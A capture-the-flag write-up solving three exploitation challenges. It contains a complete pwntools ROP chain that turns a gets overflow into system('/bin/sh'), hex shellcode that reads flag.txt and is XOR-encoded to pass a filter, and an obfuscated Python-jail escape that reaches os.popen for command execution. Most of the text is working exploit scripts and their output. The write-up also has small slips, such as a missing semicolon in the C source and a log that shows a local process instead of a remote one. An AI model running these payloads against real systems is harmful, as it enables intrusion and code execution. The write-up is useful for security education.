# rop_rop_rop_away

Given an ELF, libc and C source code of the binary. Generally speaking, libc files can determine the addresses of which where the binary is being executed. So they only thing that left is just to determine what is the correct OFFSET in order to exploit the BOF. Then, we can grab the function addresses from the libc file. 

but first, its a good idea to check the file type in order to have a clear visibily of what we are dealing with. 

```bash
file rop_rop_rop_away
rop_rop_rop_away: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0e86dbd76fcb9e38dea86cc8ec5b719140139231, for GNU/Linux 3.2.0, not stripped
```
Its important to know that the file is an 64 bit exectuable, this way we can adapt our final payload in order for our payload to work as expected. Now that we know that we are dealing with a 64 bit binary, its a good idea to check what are the protections that was implemented while compilng this binary.
```bash
checksec rop_rop_rop_away
[*] '/home/osboxes/Desktop/solver/rop_rop_rop_away'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**NX stands for No eXecute and XD stands for eXecute Disable. Both are same and is a technology used in processors to prevent execution of certain types of code.**  (you can read more about it [here](https://access.redhat.com/solutions/2936741 "here"))



Executing the binary gives the address of fgets function? 

```bash
./rop_rop_rop_away
ROP, ROP, ROP away!
-----------------------
The function fgets() is at 0X7FFFF7E477B0
Enter your character name: AAAAAAAAAAAAAAAAAAAA
Welcome AAAAAAAAAAAAAAAAAAAA to BOF wonderland!
Goodbye!
```

Looking back for the C file in order to get  a better visibilty on what is going on.. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	printf("ROP, ROP, ROP away!\n");
	printf("-----------------------\n");
	system("/bin/sh")
	//Address of gets
	printf("The function fgets() is at %p\n", fgets);

	//The buffer overflow itself
	char name[32];
	printf("Enter your character name: ");
	gets(name);

	//Print out the name
	printf("Welcome %s to BOF wonderland!\n", name);
	printf("Goodbye!\n");
	return 0;
}
```

from the given code, It is not clear how they were getting the fgets function address, but given the fact that they provided a libc file, I am gonna assume that its being extracted from there. 

From the given code, name can take only 32 buffer, and using fgets to get the user input, it's clear that we can do some evil here. After playing with the binary a littile bit, it seems that 40 is our OFFSET. 

```bash
python -c 'print "A"*40' | ./rop_rop_rop_away
ROP, ROP, ROP away!
-----------------------
The function fgets() is at 0x7ffff7e477b0
Enter your character name: Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA to BOF wonderland!
Goodbye!
ROP, ROP, ROP away!
-----------------------
The function fgets() is at 0x7ffff7e477b0
Enter your character name: Welcome  to BOF wonderland!
Goodbye!
Segmentation fault (core dumped)
```


Based on that, we can create our exploit. 

The fact that we are provided with the fgets address makes things easier, just saying.
Based on that we can calculate the libc base address, and from there everything should work like a charm. To do that, we have to substract the fgets address that is given to us when running the binary with the fgets from libc file. We can easily do that using pwntools.


```python
from pwn import *
import re

libc = ELF("./libc.so.6")
p = remote("pwn.ctf.ae",9999)
#elf = ELF("./rop_rop_rop_away")
#p = elf.process()
x = p.recv()
fgets = re.search("0[xX][0-9a-fA-F]+",x) # Regex to get fgets address
#print(x)
if fgets:
	fgets = int(fgets.group(0),16)
	#print(hex(fgets))
libc.address = fgets - libc.symbols['fgets']
```
Now that we calculated the libc base address, we can any all address within the libc file. And in this case, we want to know where [system](https://pubs.opengroup.org/onlinepubs/009604599/functions/system.html "system") is :). 

```python
system = libc.symbols['system']
```
In order to spawn a shell we need to find where /bin/sh is.

```python
bin_sh = libc.search("/bin/sh").next()
```

To pass /bin/sh into system we will need **pop rdi ; ret** we can get that using a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget "ROPGadget")

```bash
ROPgadget --binary rop_rop_rop_away | grep 'pop rdi ; ret'
0x0000000000401273 : pop rdi ; ret
```

It is also a good idea to get **ret** to avoid breaking our payload. We can also get that using ROPgadget. 

```bash
ROPgadget --binary rop_rop_rop_away | grep 'ret'
0x00000000004010eb : add bh, bh ; loopne 0x40115a ; nop ; ret
0x00000000004011fc : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004011fd : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011fe : add byte ptr [rax], al ; leave ; ret
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011ff : add cl, cl ; ret
0x00000000004010ea : add dil, dil ; loopne 0x40115b ; nop ; ret
0x00000000004010e9 : add dil, dil ; loopne 0x40115c ; nop ; ret
0x00000000004010e8 : add dil, dil ; loopne 0x40115d ; nop ; ret
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401157 : add eax, 0x2ee3 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004010c3 : cli ; ret
0x000000000040128b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040125c : fisttp word ptr [rax - 0x7d] ; ret
0x0000000000401158 : jrcxz 0x401190 ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401200 : leave ; ret
0x00000000004010ed : loopne 0x401158 ; nop ; ret
0x0000000000401156 : mov byte ptr [rip + 0x2ee3], 1 ; pop rbp ; ret
0x00000000004011fb : mov eax, 0 ; leave ; ret
0x00000000004010ef : nop ; ret
0x000000000040126c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040126e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401270 : pop r14 ; pop r15 ; ret
0x0000000000401272 : pop r15 ; ret
0x000000000040126b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040126f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040115d : pop rbp ; ret
0x0000000000401273 : pop rdi ; ret
0x0000000000401271 : pop rsi ; pop r15 ; ret
0x000000000040126d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret ## This is what we want
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040128d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040128c : sub rsp, 8 ; add rsp, 8 ; ret
```
Putting all of it together, our exploit should work. Here is the final exploit. 
```python
from pwn import *
import re

libc = ELF("./libc.so.6")
p = remote("pwn.ctf.ae",9999)
#elf = ELF("./rop_rop_rop_away")
#p = elf.process()
x = p.recv()
fgets = re.search("0[xX][0-9a-fA-F]+",x)
#print(x)
if fgets:
	fgets = int(fgets.group(0),16)
	#print(hex(fgets))
libc.address = fgets - libc.symbols['fgets']

system = libc.symbols['system']
bin_sh = libc.search("/bin/sh").next()
pop_rdi = 0x0000000000401273 
ret = 0x000000000040101a
rop_chain = [

	pop_rdi,bin_sh,
	ret,system
	]
print("[+] libc base {}".format(hex(libc.address)))
print("[+] system {}".format(hex(system)))
print("[+] /bin/sh {}".format(hex(bin_sh)))
rop_chain = ''.join([p64(r) for r in rop_chain])
payload = "B" * 40 + rop_chain
print(payload)
p.sendline(payload)
p.interactive()
```
Executing the python script should provide us an interactive shell.
```bash
$ python solve.py 
[*] '/home/osboxes/Desktop/solver/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/osboxes/Desktop/solver/rop_rop_rop_away'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/osboxes/Desktop/solver/rop_rop_rop_away': pid 59235
[+] libc base 0x7ffff7dc2000
[+] system 0x7ffff7e17410
[+] /bin/sh 0x7ffff7f795aa
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12\x00\x00\x00\x95���\x00\x1a@\x00\x00\x00t���\x7f\x00
[*] Switching to interactive mode
Enter your character name: Welcome BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12 to BOF wonderland!
Goodbye!
$ 
```


# Shellcode Tester

This challenge was pretty much straight forward, the goal is to provide a shellcode that can read flag.txt. 

```bash
nc pwn.ctf.ae 1221

     _          _ _               _         _            _
 ___| |__   ___| | | ___ ___   __| | ___   | |_ ___  ___| |_ ___ _ __
/ __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \  | __/ _ \/ __| __/ _ \ '__|
\__ \ | | |  __/ | | (_| (_) | (_| |  __/  | ||  __/\__ \ ||  __/ |
|___/_| |_|\___|_|_|\___\___/ \__,_|\___|___\__\___||___/\__\___|_|
                                       |_____|
----------------------------------------------------------------------------------
Welcome! You can send any shellcode you want (100 bytes limit) and it will be executed after each byte is XOR'd with a random key!
Keep in mind this instance is extremely firewalled so no reverse/bind shells are allowed!
----------------------------------------------------------------------------------


Please send your base64 encoded x64 shellcode that will be XOR'd with 0xb6 and executed:


```

sor our shellcode will be XORed then base64 decoded, and then it will be executed.. I am not sure what is the purpose of this, but lets go with the flow.. [Googling](http://blog.dornea.nu/2016/08/23/testing-shellcodes/ "Googling") for a 64 bit shellcode that reads flag.txt and found one.

So our goal is as the following: <br/>
1- Find the appropiate shellcode <br/>
2-XOR it with whatever the server replies <br/>
3- base64 encode it <br/>

```python
from pwn import *
import re
import base64
r = remote("pwn.ctf.ae",1221)

r.recv()

shellcode="\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74"
txt =r.recv()

key = re.search("XOR'd with (.*) and",txt)

if key:
	key = int(key.group(1),16)
	print(shellcode)
	payload = xor(shellcode,key)
	print(payload)
	payload = base64.b64encode(payload)
	print(payload)

r.sendline(payload)
r.stream()
```

Exectuing the script should give the flag.txt content. 


```bash
$ python solve.py 
[+] Opening connection to pwn.ctf.ae on port 1221: Done
�?_\x80w\x0bH1�H1�f\x81��H\x8d4$H\x89�H1�f\xba\xff\x0f1�\x051\xff@\x80�H\x89�H1�\x0fH1�<\x0f��\xff\xffflag.txt
q\xa5����ҫZ\x9e\x98ҫl\x95\x9f�e��\x17\xbe�]ҫH� e�ҫZ\x95\x9fҫe��]\x9b�XҫZ\x9e\x9b\x95\x9fҫZ\x9e\xa6\x95\x9fr&eee��������
caXFGu2R29KrWp6Y0qtslZ/8G3ZlldIXrr7SE13Sq0j8IGWV0qtalZ/Sq2XaGl2b0hNY0qtanpuVn9KrWp6mlZ9yJmVlZfz2+/207uLu
Shellcode Length: 78
Decoded and XOR'd shellcode: \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74
Shellcode Output: DPCTF{SallySellsShellcodesOnTheSeashore}

Error executing shellcode. Command '['/tmp/tmpt8uuz547/shellcode']' returned non-zero exit status 1.
[*] Closed connection to pwn.ctf.ae port 1221
```

# Odd Service

This challenge was really Odd in serveral ways. So after connecting to the service it replies with some AES-256 encrypted string, and somehow, it provides the key. 

```bash
nc pwn.ctf.ae 1337
Hi, please use base64 encoded AES-256-ECB using PKCS7 padding with a secret of 'sjoqkxKpsAgAuHosIitUSXLoDMfBDHGQ'.
emoL/Sp/p4F0khEMfKKeaveeZfZRoXMNBHHuvZJomyc=
```

So first we have to know what is the value of what is it encrypting? that can be done also with pwntools. 

```python
from Crypto.Cipher import AES
from base64 import b64encode,b64decode
from pwn import *


def pad(m):
    return m+chr(16-len(m)%16)*(16-len(m)%16)
p = remote("pwn.ctf.ae",1337)

key = p.recv().split("'")[1]

text = p.recv().strip()
print(key,text)

plaintext = b64decode(text)
obj = AES.new(key, AES.MODE_ECB)
ciphertext = obj.decrypt(plaintext)
```

Executing the script outputs **Hello, please send your input!**. Sending anything with the encryption key we were provided raises an error.** invalid syntax (<string>, line 1)**.

So we have to somehow send a python code that can read flag.txt. After a bit of playing with the payload, it seems that this is a python jail. Luckly, pyjail can be easily bypassed. The following payload seems to be working. 

```python
payload = """__builtins__.__dict__['ev'+"al"]("__imp"+"ort__('o"+"s').po"+"pen('ls').read()")"""
```
So putting all of this together should acheive RCE. 

```python
from Crypto.Cipher import AES
from base64 import b64encode,b64decode
from pwn import *


def pad(m):
    return m+chr(16-len(m)%16)*(16-len(m)%16)
p = remote("pwn.ctf.ae",1337)

key = p.recv().split("'")[1]

text = p.recv().strip()

plaintext = b64decode(text)
obj = AES.new(key, AES.MODE_ECB)
ciphertext = obj.decrypt(plaintext)

payload = """__builtins__.__dict__['ev'+"al"]("__imp"+"ort__('o"+"s').po"+"pen('cat flag.txt').read()")"""
ciphertext = obj.encrypt(pad(payload))
p.sendline(b64encode(ciphertext).decode())
plaintext = b64decode(p.recv())
ciphertext = obj.decrypt(pad(plaintext))

print(ciphertext)
```

Executing the script should outputs the flag.

```bash
python solve.py 
[+] Opening connection to pwn.ctf.ae on port 1337: Done
DPCTF{3ncrypt3dDo3sntAlwaysM3anS3cur3}
\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19O��B\x85+�O\x9b\xaa-Ĳ\xa1
[*] Closed connection to pwn.ctf.ae port 1337

```

